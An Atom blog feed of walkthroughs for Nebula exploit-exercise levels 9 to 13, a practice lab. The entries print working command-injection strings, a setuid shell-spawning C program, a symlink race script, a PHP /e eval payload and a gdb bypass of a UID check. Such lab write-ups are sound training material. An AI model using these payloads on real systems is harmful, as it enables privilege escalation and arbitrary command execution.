<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Exercises | Han]]></title>
  <link href="http://hanjc.me/blog/categories/exercises/atom.xml" rel="self"/>
  <link href="http://hanjc.me/"/>
  <updated>2014-05-20T21:42:39+08:00</updated>
  <id>http://hanjc.me/</id>
  <author>
    <name><![CDATA[Zealoct]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 13]]></title>
    <link href="http://hanjc.me/blog/2014/01/26/nebula-level13/"/>
    <updated>2014-01-26T21:54:12+08:00</updated>
    <id>http://hanjc.me/blog/2014/01/26/nebula-level13</id>
    <content type="html"><![CDATA[<h3>About</h3>

<p>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</p>

<p>To do this level, log in as the <em>level13</em> account with the password <em>level13</em> . Files for this level can be found in /home/flag13.</p>

<!-- more -->


<h3>Source code</h3>

<p>``` c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;string.h></h1>

<h1>define FAKEUID 1000</h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{</p>

<pre><code>int c;
char token[256];

if(getuid() != FAKEUID) {
    printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
    printf("The system administrators will be notified of this violation\n");
    exit(EXIT_FAILURE);
}

// snip, sorry :)

printf("your token is %s\n", token);
</code></pre>

<p>}</p>

<p>```</p>

<h3>Solution</h3>

<p>There is no way for me to be uid 1000, but this executable which contains the token is right here, we cannot be stopped by a simple <code>if</code> branch.</p>

<p>Disassemble the executable <em>flag13</em></p>

<p><code>bash
level13@nebula:~$ objdump -D /home/flag13/flag13 &gt; /home/level13/flag13.asm
</code></p>

<p>Go to the instruction corresponding to the last <em>printf()</em> in the c code, I thought I could read the password out directly from the memory location where <em>token</em> is stored. Turned out that <em>token</em> is calculated with mass of code. Well, as I cannot read the password directly, I could always change the execution flow and let the program print that out.</p>

<p><code>text flag13.asm
080484c4 &lt;main&gt;:
 80484c4:       55                      push   %ebp
 80484c5:       89 e5                   mov    %esp,%ebp
 80484c7:       57                      push   %edi
 80484c8:       53                      push   %ebx
 80484c9:       83 e4 f0                and    $0xfffffff0,%esp
 80484cc:       81 ec 30 01 00 00       sub    $0x130,%esp
 80484d2:       8b 45 0c                mov    0xc(%ebp),%eax
 80484d5:       89 44 24 1c             mov    %eax,0x1c(%esp)
 80484d9:       8b 45 10                mov    0x10(%ebp),%eax
 80484dc:       89 44 24 18             mov    %eax,0x18(%esp)
 80484e0:       65 a1 14 00 00 00       mov    %gs:0x14,%eax
 80484e6:       89 84 24 2c 01 00 00    mov    %eax,0x12c(%esp)
 80484ed:       31 c0                   xor    %eax,%eax
 80484ef:       e8 cc fe ff ff          call   80483c0 &lt;getuid@plt&gt;
 80484f4:       3d e8 03 00 00          cmp    $0x3e8,%eax
 80484f9:       74 36                   je     8048531 &lt;main+0x6d&gt;
 80484fb:       e8 c0 fe ff ff          call   80483c0 &lt;getuid@plt&gt;
 8048500:       ba d0 86 04 08          mov    $0x80486d0,%edx
 8048505:       c7 44 24 08 e8 03 00    movl   $0x3e8,0x8(%esp)
...
</code></p>

<p>This is the snippet of function <em>main()</em>, note that line 16 compare <em>%eax</em> (which is the return value of function call <em>getuid()</em>) with <em>0x3e8</em>, and line 17 will jump to memory location 0x8048531 if they are equal.</p>

<p>In a normal execution, these are apparantly not equal, but we could make it equal with <em>gdb</em>.</p>

<ol>
<li>copy <em>flag13</em> into /home/level13</li>
<li>start it with <em>gdb</em></li>
<li>set a break point at 0x80484f4, which is the instruction to compare</li>
<li>run the program</li>
<li>modify %eax to 1000 at the break point</li>
<li>continue run the program</li>
</ol>


<p>``` bash</p>

<h1>start flag13 with gdb</h1>

<p>level13@nebula:~$ gdb flag13</p>

<h1>set break point and run</h1>

<p>(gdb) b *0x80484f4
Breakpoint 1 at 0x80484f4
(gdb) run
Starting program: /home/level13/flag13</p>

<h1>reach break point, let&rsquo;s take a look at where we are</h1>

<p>Breakpoint 1, 0x080484f4 in main ()
(gdb) disassemble
Dump of assembler code for function main:
   0x080484e0 &lt;+28>:    mov    %gs:0x14,%eax
   0x080484e6 &lt;+34>:    mov    %eax,0x12c(%esp)
   0x080484ed &lt;+41>:    xor    %eax,%eax
   0x080484ef &lt;+43>:    call   0x80483c0 &lt;getuid@plt>
=> 0x080484f4 &lt;+48>:    cmp    $0x3e8,%eax
   0x080484f9 &lt;+53>:    je     0x8048531 &lt;main+109>
   0x080484fb &lt;+55>:    call   0x80483c0 &lt;getuid@plt></p>

<h1>here we print the registers out, %eax is 1014</h1>

<p>(gdb) i r
eax            0x3f6    1014
ecx            0xbffff804       -1073743868
&hellip;</p>

<h1>change %eax</h1>

<p>(gdb) set $eax=1000
(gdb) i r
eax            0x3e8    1000
ecx            0xbffff804       -1073743868
&hellip;</p>

<h1>continue execution</h1>

<p>(gdb) continue
Continuing.
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
[Inferior 1 (process 31018) exited with code 063]
```
Now <em>su</em> to <em>flag13</em> with the token.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 12]]></title>
    <link href="http://hanjc.me/blog/2014/01/26/nebula-level12/"/>
    <updated>2014-01-26T20:12:53+08:00</updated>
    <id>http://hanjc.me/blog/2014/01/26/nebula-level12</id>
    <content type="html"><![CDATA[<h3>About</h3>

<p>There is a backdoor process listening on port 50001.</p>

<p>To do this level, log in as the <em>level12</em> account with the password <em>level12</em>. Files for this level can be found in /home/flag12.</p>

<!-- more -->


<h3>Source code</h3>

<p>``` lua /home/flag12/flag12.lua
local socketlocal socket = require(&ldquo;socket&rdquo;)
local server = assert(socket.bind(&ldquo;127.0.0.1&rdquo;, 50001))</p>

<p>function hash(password)
  prog = io.popen(&ldquo;echo &rdquo;..password..&ldquo; | sha1sum&rdquo;, &ldquo;r&rdquo;)
  data = prog:read(&ldquo;*all&rdquo;)
  prog:close()</p>

<p>  data = string.sub(data, 1, 40)</p>

<p>  return data
end</p>

<p>while 1 do
  local client = server:accept()
  client:send(&ldquo;Password: &rdquo;)
  client:settimeout(60)
  local line, err = client:receive()
  if not err then</p>

<pre><code>print("trying " .. line) -- log from where ;\
local h = hash(line)

if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
  client:send("Better luck next time\n");
else
  client:send("Congrats, your token is 413**CARRIER LOST**\n")
end
</code></pre>

<p>  end</p>

<p>  client:close()
end
```</p>

<h3>Solution</h3>

<p><code>prog = io.popen("echo "..password.." | sha1sum", "r")</code> this line of code in <em>hash()</em> function try to calc the hash of the password, but we can execute any command with a well structed <em>password</em>.</p>

<p>Write a simple Ruby script to send command to server, here I construct a <em>password</em> to make the server build a <em>drop.c</em> file into directory /home/flag12.</p>

<p>``` ruby
require &lsquo;socket&rsquo;</p>

<p>server = TCPSocket.open(&ldquo;127.0.0.1&rdquo;, 50001)
server.puts(&ldquo;hello &amp;&amp; gcc -o /home/flag12/flag12 /tmp/drop.c &amp;&amp; chmod 777 /home/flag12/flag12 &amp;&amp; chmod +s /home/flag12/flag12 &amp;&amp; echo hello &rdquo;)
ret = server.gets.chomp
puts &ldquo;#{ret}&rdquo;
```</p>

<p>Remenber the piece of C code we used to drop privilege? Here it is again:</p>

<p>``` c /tmp/drop.c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<p>int main() {
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();</p>

<p>  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);</p>

<p>  execv(&ldquo;/bin/bash&rdquo;, NULL);
}
```</p>

<p>Run the Ruby script, I got</p>

<p><code>bash
level12@nebula:~$ ruby client.rb
Password: Better luck next time
</code></p>

<p>It is all right, I have no interest in the password anyway. Take a look at the directory /home/flag12</p>

<p><code>bash
flag12@nebula:~$ ll /home/flag12
total 14
drwxr-x--- 1 flag12 level12   60 2014-03-02 22:45 ./
drwxr-xr-x 1 root   root     280 2012-08-27 07:18 ../
-rw-r--r-- 1 flag12 flag12   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag12 flag12  3353 2011-05-18 02:54 .bashrc
-rwsrwsrwx 1 flag12 flag12  7322 2014-03-02 22:45 flag12*
-rw-r--r-- 1 root   root     685 2011-11-20 21:22 flag12.lua
-rw-r--r-- 1 flag12 flag12   675 2011-05-18 02:54 .profile
</code></p>

<p>Here is the executable <em>flag12</em> with Set-User-ID bit, run it and a bash with <em>flag12</em> user privilege will show up!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 11]]></title>
    <link href="http://hanjc.me/blog/2014/01/26/nebula-level11/"/>
    <updated>2014-01-26T16:44:20+08:00</updated>
    <id>http://hanjc.me/blog/2014/01/26/nebula-level11</id>
    <content type="html"><![CDATA[<h3>About</h3>

<p>The <em>/home/flag11/flag11</em> binary processes standard input and executes a shell command.</p>

<p>There are two ways of completing this level, you may wish to do both :&ndash;)</p>

<p>To do this level, log in as the <em>level11</em> account with the password <em>level11</em> . Files for this level can be found in /home/flag11.</p>

<!-- more -->


<h3>Source code</h3>

<p>``` c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;fcntl.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/mman.h></h1>

<p>/<em>
 * Return a random, non predictable file, and return the file descriptor for it.
 </em>/</p>

<p>int getrand(char **path)
{</p>

<pre><code>char *tmp;
int pid;
int fd;

srandom(time(NULL));

tmp = getenv("TEMP");
pid = getpid();

asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid, 
         'A' + (random() % 26), '0' + (random() % 10), 
         'a' + (random() % 26), 'A' + (random() % 26),
         '0' + (random() % 10), 'a' + (random() % 26));

fd = open(*path, O_CREAT|O_RDWR, 0600);
unlink(*path);
return fd;
</code></pre>

<p>}</p>

<p>void process(char *buffer, int length)
{</p>

<pre><code>unsigned int key;
int i;

key = length &amp; 0xff;

for(i = 0; i &lt; length; i++) {
    buffer[i] ^= key;
    key -= buffer[i];
}

system(buffer);
</code></pre>

<p>}</p>

<h1>define CL &ldquo;Content-Length: &rdquo;</h1>

<p>int main(int argc, char **argv)
{</p>

<pre><code>char line[256];
char buf[1024];
char *mem;
int length;
int fd;
char *path;

if(fgets(line, sizeof(line), stdin) == NULL) {
    errx(1, "reading from stdin");
}

if(strncmp(line, CL, strlen(CL)) != 0) {
    errx(1, "invalid header");
}

length = atoi(line + strlen(CL));

if(length &lt; sizeof(buf)) {
    if(fread(buf, length, 1, stdin) != length) {
        err(1, "fread length");
    }
    process(buf, length);
} else {
    int blue = length;
    int pink;

    fd = getrand(&amp;path);

    while(blue &gt; 0) {
        printf("blue = %d, length = %d, ", blue, length);

        pink = fread(buf, 1, sizeof(buf), stdin);
        printf("pink = %d\n", pink);

        if(pink &lt;= 0) {
            err(1, "fread fail(blue = %d, length = %d)", blue, length);
        }
        write(fd, buf, pink);

        blue -= pink;
    }  

    mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
    if(mem == MAP_FAILED) {
        err(1, "mmap");
    }
    process(mem, length);
}
</code></pre>

<p>}</p>

<p>```</p>

<h3>Solution</h3>

<p>In fact I have not passed this one yet, I have met a <strong>problem</strong> which I will talk about later,
right now I just want to explain my <strong>idea</strong>.</p>

<p>The overall function of the program <em>/home/flag11/flag11</em> is to read some inputs, do some modifications to the inputs and then execute what it gets after the modification.</p>

<p>More specifically, <em>flag11</em> requires that the input should match the following pattern:</p>

<pre><code>Content-Length: %d
Content...
</code></pre>

<p>here, depends on the content length <em>%d</em>, <em>flag11</em> will go into two branches, if <code>length &lt; sizeof(buf)</code>,
<em>flag11</em> would read the content directly into <em>buf</em> and pass it to <em>process</em>.
Note that it is required that <code>fread(buf, length, 1, stdin) == length</code>, so we know that <em>length</em> must be 1.
(refer to <a href="http://linux.die.net/man/3/fread">manpage</a> of <em>fread()</em> for details)</p>

<p>Otherwise if <em>length</em> is any number larger or equal to 1024, <em>flag11</em> would buffer the input into a file first,
then pass the content of the file to <em>process</em>. I think these are the TWO WAYS mentioned in the description.</p>

<p>The function <em>process</em> would do some calculation on <em>buf</em> based on its content using XOR operation.
So if we want to executes some commands like <em>/bin/getflag</em>, we need to do some reverse calculation and find out
what the origin <em>buf</em> would be like.</p>

<h4>Way One</h4>

<p>My first thought was that I could make <em>length</em> to be 1, and make a soft link to <em>/bin/getflag</em>, then leverage
<em>flag11</em> to execute this soft link. I first create a file <em>f.txt</em></p>

<p>``` text f.txt
Content-Length: 1
f</p>

<p>```</p>

<p>You can expect that <code>'f' ^ (length&amp;&amp;0xff) == 'g'</code>, where <em>length</em> is 1.
Then I would execute the following</p>

<p>``` bash
level11@nebula:~$ ln -s /bin/getflag /tmp/g
level11@nebula:~$ export PATH=/tmp/:$PATH</p>

<p>level11@nebula:~$ /home/flag11/flag11 &lt; /home/level11/f.txt
sh: gP,: command not found</p>

<p>level11@nebula:/home/flag11$ ./flag11 &lt; /home/level11/f.txt
sh: $&lsquo;g\240\030&rsquo;: command not found
```</p>

<p>Failed. Since each time the output command are different (but the first char <em>g</em> is correct),
it must be that <em>buf</em> actually do not have a string terminator &lsquo;\0&rsquo;,
so I tried a few times and finally</p>

<p><code>bash
level11@nebula:~$ ../flag11/flag11 &lt; ls.txt
getflag is executing on a non-flag account, this doesn't count
</code></p>

<p>Well&hellip;here is the <strong>problem</strong>, the <em>system()</em> call would not drop privilege on my system&hellip;</p>

<p>I read the <a href="http://linux.die.net/man/3/system">manpage</a> of <em>system()</em> carefully, it mentioned that</p>

<blockquote><p>Do not use system() from a program with set-user-ID or set-group-ID privileges, because strange values for some environment variables might be used to subvert system integrity. Use the exec(3) family of functions instead, but not execlp(3) or execvp(3). system() will not, in fact, work properly from programs with set-user-ID or set-group-ID privileges on systems on which /bin/sh is bash version 2, since bash 2 drops privileges on startup. (Debian uses a modified bash which does not do this when invoked as sh.)</p></blockquote>

<p>I also did some google and find <a href="http://www.cplusplus.com/forum/articles/11153/">this</a> thread on cplusplus
and <a href="http://stackoverflow.com/questions/16258830/does-system-syscall-drop-privileges">this</a>
question on Stackoverflow ot be useful. It is said that <em>system()</em> itself would not drop privileges,
but Bash 2 would, and my bash is version 4, so I think this meybe the reason.</p>

<p>I came across an interesting solution for this routine by <a href="http://v0ids3curity.blogspot.com/2012/12/exploit-exercise-level-11.html">Reno Robert</a>, who leveraged <em>LD_PRELOAD</em> to initialize the buffer.</p>

<h4>Way Two</h4>

<p>Anyway, before I realized this problem, I did do something through the second way,
to get what the input should be from the output command, I wrote another program <em>gen.c</em>:</p>

<p>``` c gen.c
void process(char *buffer, int length)
{</p>

<pre><code>    unsigned int key;
    int i;

    key = length &amp; 0xff;

    for(i = 0; i &lt; length; i++) {
            buffer[i] ^= key;
            key -= (key ^ buffer[i]);
    }
    //system(buffer);
</code></pre>

<p>}</p>

<p>main() {
  char<em> cmd = &ldquo;getflag&rdquo;;
  char buf[1024];
  int len = strlen(cmd);
  memset((void </em>)buf, 0, 1024>>2);
  strncpy(buf, cmd, len+1);</p>

<p>  process(buf, 1024);
  printf(&ldquo;Content-Length: 1024\n&rdquo;);
  fwrite(buf, 1024, 1, stdout);
}
```</p>

<p>and after compiling into an executable <em>gen</em>, I tried to trigger the exploit like this</p>

<p>``` bash
level11@nebula:~$ ./gen | ../flag11/flag11
blue = 1024, length = 1024, pink = 1024
getflag is executing on a non-flag account, this doesn&rsquo;t count</p>

<p>```
same failure, and after that I changed the <em>cmd</em> from &ldquo;getflag&rdquo; to &ldquo;id&rdquo; ,
and the output is</p>

<p><code>bash
level11@nebula:~$ ./gen | ../flag11/flag11
blue = 1024, length = 1024, pink = 1024
uid=1012(level11) gid=1012(level11) groups=1012(level11)
</code></p>

<p>No privilege dropped )=</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 10]]></title>
    <link href="http://hanjc.me/blog/2014/01/25/nebula-level10/"/>
    <updated>2014-01-25T12:40:53+08:00</updated>
    <id>http://hanjc.me/blog/2014/01/25/nebula-level10</id>
    <content type="html"><![CDATA[<h3>About</h3>

<p>The setuid binary at <em>/home/flag10/flag10</em> binary will upload any file given, as long as it meets the requirements of the <em>access()</em> system call.</p>

<p>To do this level, log in as the <em>level10</em> account with the password <em>level10</em>. Files for this level can be found in /home/flag10.</p>

<h3>Source Code</h3>

<p>``` c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;fcntl.h></h1>

<h1>include &lt;errno.h></h1>

<h1>include &lt;sys/socket.h></h1>

<h1>include &lt;netinet/in.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char <em><em>argv)
{
  char </em>file;
  char </em>host;</p>

<p>  if(argc &lt; 3) {</p>

<pre><code>printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
exit(1);
</code></pre>

<p>  }</p>

<p>  file = argv[1];
  host = argv[2];</p>

<p>  if(access(argv[1], R_OK) == 0) {</p>

<pre><code>int fd;
int ffd;
int rc;
struct sockaddr_in sin;
char buffer[4096];

printf("Connecting to %s:18211 .. ", host); fflush(stdout);

fd = socket(AF_INET, SOCK_STREAM, 0);

memset(&amp;sin, 0, sizeof(struct sockaddr_in));
sin.sin_family = AF_INET;
sin.sin_addr.s_addr = inet_addr(host);
sin.sin_port = htons(18211);

if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) {
  printf("Unable to connect to host %s\n", host);
  exit(EXIT_FAILURE);
}
</code></pre>

<h1>define HITHERE &ldquo;.oO Oo.\n&rdquo;</h1>

<pre><code>if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
  printf("Unable to write banner to host %s\n", host);
  exit(EXIT_FAILURE);
}
</code></pre>

<h1>undef HITHERE</h1>

<pre><code>printf("Connected!\nSending file .. "); fflush(stdout);

ffd = open(file, O_RDONLY);
if(ffd == -1) {
  printf("Damn. Unable to open file\n");
  exit(EXIT_FAILURE);
}

rc = read(ffd, buffer, sizeof(buffer));
if(rc == -1) {
  printf("Unable to read from file: %s\n", strerror(errno));
  exit(EXIT_FAILURE);
}

write(fd, buffer, rc);

printf("wrote file!\n");
</code></pre>

<p>  } else {</p>

<pre><code>printf("You don't have access to %s\n", file);
</code></pre>

<p>  }
}
```</p>

<!-- more -->


<p>There at two files in the directory /home/flag10, <em>flag10</em> and <em>token</em>. The source code of executable <em>flag10</em> in shown above, and <em>token</em> contains the password of user <em>flag10</em>. The goal is to read the content of <em>token</em>.</p>

<p>The attack comes from a common bug called <a href="http://en.wikipedia.org/wiki/Time-of-check-to-time-of-use">Time of check to time of use</a>, the Wiki page above explains precisely about what this bug is and how it can be exploited. So in my imagination this is how this attack would look like:</p>

<ol>
<li>pass <em>/home/level10/token</em> whick links to a real user(<em>level10</em>) readable file <em>/home/level10/test</em> to the program as <code>argv[1]</code></li>
<li><em>/home/flag10/flag10</em> checks whether this file is accessable at line 24(with the result true)</li>
<li>modify the file to link to <em>/home/flag10/token</em> when <em>/home/flag10/flag10</em> is executing code between line 24 and line 54</li>
<li>when <em>/home/flag10/flag10</em> reads the file at line 54, it reads <em>/home/flag10/token</em></li>
</ol>


<p>The most important step mentioned above is step 3, it is hard to control the time! Fortunately, the <em>flag10</em> program will send a banner before actually read the file(line 46), this leaves me some time to make some change!</p>

<p>Notice that the content of the file would be transmit through a socket connection, so I need to write my own server code. In my consideration, I need to change the file <em>/home/level10/token</em> immediately after the server accepts a connection from the client, I wrote this server code in Ruby:</p>

<p>``` ruby
require &lsquo;socket&rsquo;</p>

<p>server = TCPServer.new(18211)
loop {</p>

<pre><code>client = server.accept
`rm /home/level10/token; ln -s /home/flag10/token /home/level10/token`
while msg = client.gets
    puts "RECV: #{msg}"
end
</code></pre>

<p>}
```</p>

<p>After the server was started, I triggered the vulnerability with the following command</p>

<pre><code>$ /home/flag10/flag10 ~/token 127.0.0.1
</code></pre>

<p>Note that the symbolic file <em>~/token</em> must exist and point to a file that is readable by user <em>level10</em> before the program <em>flag10</em> is executed.</p>

<p>The output of the Ruby code was not always as expected, sometimes the client read the file before the server changed it, but as long as it could be right, it hacked!</p>

<p>``` bash
level10@nebula:~$ ruby serv.rb
RECV: .oO Oo.
RECV: hello world</p>

<p>level10@nebula:~$ ruby serv.rb
RECV: .oO Oo.
RECV: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 09]]></title>
    <link href="http://hanjc.me/blog/2014/01/24/nebula-level09/"/>
    <updated>2014-01-24T11:43:40+08:00</updated>
    <id>http://hanjc.me/blog/2014/01/24/nebula-level09</id>
    <content type="html"><![CDATA[<h3>About</h3>

<p>There&rsquo;s a C setuid wrapper for some vulnerable PHP code&hellip;</p>

<p>To do this level, log in as the <em>level09</em> account with the password <em>level09</em>. Files for this level can be found in /home/flag09.</p>

<h3>Source code</h3>

<p>``` php
&lt;?php</p>

<p>function spam($email)
{
  $email = preg_replace(&ldquo;/./&rdquo;, &ldquo; dot &rdquo;, $email);
  $email = preg_replace(&ldquo;/@/&rdquo;, &ldquo; AT &rdquo;, $email);</p>

<p>  return $email;
}</p>

<p>function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);</p>

<p>  $contents = preg_replace(&ldquo;/([email (.*)])/e&rdquo;, &ldquo;spam(\&rdquo;\2\&ldquo;)&rdquo;, $contents);
  $contents = preg_replace(&ldquo;/[/&rdquo;, &ldquo;&lt;&rdquo;, $contents);
  $contents = preg_replace(&ldquo;/]/&rdquo;, &ldquo;>&rdquo;, $contents);</p>

<p>  return $contents;
}</p>

<p>$output = markup($argv[1], $argv[2]);</p>

<p>print $output;</p>

<p>?>
```</p>

<!-- more -->


<h3>Solution</h3>

<p>This php snippet does the following things:</p>

<ul>
<li>read the content of file $argv[1]</li>
<li>replace all the text paterns liket &ldquo;[email <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#58;&#104;&#x6a;&#x63;&#64;&#x68;&#x61;&#x6e;&#x6a;&#x63;&#x2e;&#109;&#101;">&#x68;&#x6a;&#99;&#64;&#104;&#x61;&#x6e;&#106;&#x63;&#x2e;&#x6d;&#101;</a>]&rdquo; with &ldquo;hjc AT hanjc dot me&rdquo;</li>
<li>replace all the &ldquo;[&rdquo; with &ldquo;&lt;&rdquo;, replace &ldquo;]&rdquo; with &ldquo;>&rdquo;</li>
</ul>


<p>At the very first glace, there seems to be no problem about this code (well, turns out to be that anyone who is familiar with php security would recognize immediatly the vulnerability). But what I knew was that if there be something wrong, it must be the php function <code>preg_replace</code>.</p>

<p>Google this function and I found many useful thing. There is a <a href="https://bugs.php.net/bug.php?id=35960">bug report</a> related to this function, and another <a href="http://www.madirish.net/402">article</a> explains in detail about how to exploit this vulnerability.</p>

<p>In general, the vulnerability exists when a &ldquo;\e&rdquo; is set in the PCRE expression provided to the <code>preg_replace</code> function (as in the code above), in this case, php will do normal substitution of backreferences in the replacement string, evaluate it as PHP code, and use the result for replacing the search string, as mentioned <a href="http://php.net/manual/en/reference.pcre.pattern.modifiers.php">here</a>. This link also provides an input string tha could exploit this function, which is</p>

<pre><code>&lt;h1&gt;{${eval($_GET[php_code])}}&lt;/h1&gt;
</code></pre>

<p>As my goal is to run system command with this function, I modified this attack string to be</p>

<pre><code>[email {${system('touch /home/flag09/test')}}]
</code></pre>

<p>Save this string in /tmp/txt, and run the following command</p>

<p><code>bash
$ /home/flag09/flag09 /tmp/txt noused
</code></p>

<p>Although the program produced some errors, the file /home/flag09/test indeed appeared! So this should be a doable way to execute any command, but it is not convenient. Notice there is an additional argument <code>$use_me</code> to function <code>markup</code> that is never used in the function, the name of this variable indicates its purpose, which is too obvious to ignore. So I modified /tmp/txt to</p>

<pre><code>[email {${system($use_me)}}]
</code></pre>

<p>Now I could run any command with</p>

<p><code>bash
$ /home/flag09/flag09 /tmp/txt "any command"
</code></p>
]]></content>
  </entry>
  
</feed>
